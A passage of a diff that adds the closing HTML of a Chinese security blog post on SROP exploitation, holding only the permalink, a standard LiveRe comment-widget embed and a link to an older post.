+                        <strong>本文链接：</strong><a href="http://jinyu00.github.io/2017/12/16/pwn_with_srop.html">http://jinyu00.github.io/2017/12/16/pwn_with_srop.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 来必力 -->
+<div id="livere-comment">
+    <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+</div>
+<style>
+    #livere-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2017/12/16/syscall_to_rop.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
